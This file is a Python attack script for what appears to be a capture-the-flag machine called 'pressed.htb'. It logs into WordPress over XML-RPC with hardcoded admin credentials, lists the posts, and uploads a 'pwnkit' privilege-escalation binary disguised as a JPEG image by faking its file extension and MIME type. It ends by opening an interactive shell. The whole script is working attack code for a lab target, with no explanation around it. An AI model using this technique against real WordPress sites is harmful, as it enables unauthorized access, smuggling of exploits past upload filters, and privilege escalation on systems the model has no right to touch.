#!/usr/bin/env python3

import collections
import collections.abc

# Apply patch
if not hasattr(collections, 'Iterable'):
    collections.Iterable = collections.abc.Iterable
if not hasattr(collections, 'Mapping'):
    collections.Mapping = collections.abc.Mapping
if not hasattr(collections, 'MutableMapping'):
    collections.MutableMapping = collections.abc.MutableMapping
if not hasattr(collections, 'Sequence'):
    collections.Sequence = collections.abc.Sequence
if not hasattr(collections, 'MutableSequence'):
    collections.MutableSequence = collections.abc.MutableSequence

from wordpress_xmlrpc import Client
from wordpress_xmlrpc.compat import xmlrpc_client
from wordpress_xmlrpc.methods import posts, media

# Your code here
url = "http://pressed.htb/xmlrpc.php"
username = "admin"
password = "uhc-jan-finals-2022"

client = Client(url, username, password)

print("=== WordPress Posts ===")
plist = client.call(posts.GetPosts())
for post in plist:
    print(f"ID: {post.id}, Title: {post.title}, Date: {post.date}")

print("\n" + "="*50)
print("Uploading pwnkit file...")

# Upload the pwnkit file as an image
try:
    # Prepare data for upload
    data = {
        'name': 'pwnkit.jpg',  # Use .jpg extension
        'type': 'image/jpeg',  # Use image/jpeg MIME type
    }
    
    # Read and upload the file
    with open("pwnkit", 'rb') as f:
        data['bits'] = xmlrpc_client.Binary(f.read())
    
    # Upload to WordPress
    print(f"Attempting to upload {data['name']} as {data['type']}...")
    r = client.call(media.UploadFile(data))
    
    print("\n=== Upload Successful! ===")
    print(f"File ID: {r['id']}")
    print(f"URL: {r['url']}")
    print(f"Title: {r['title']}")
    print(f"Type: {r['type']}")
    print(f"File: {r['file']}")
    print(f"Full response: {r}")
    
except FileNotFoundError:
    print("Error: 'pwnkit' file not found in current directory!")
    print("Please make sure the 'pwnkit' file exists.")
except Exception as e:
    print(f"Error during upload: {e}")
    print(f"Error type: {type(e).__name__}")

# Drop into interactive shell
print("\n" + "="*50)
print("Dropping into interactive shell...")
print("Client object is available as 'client'")
print("Response object is available as 'r' (if upload succeeded)")
print("Type 'exit()' to quit")
print("="*50 + "\n")

import code
code.interact(local=locals())
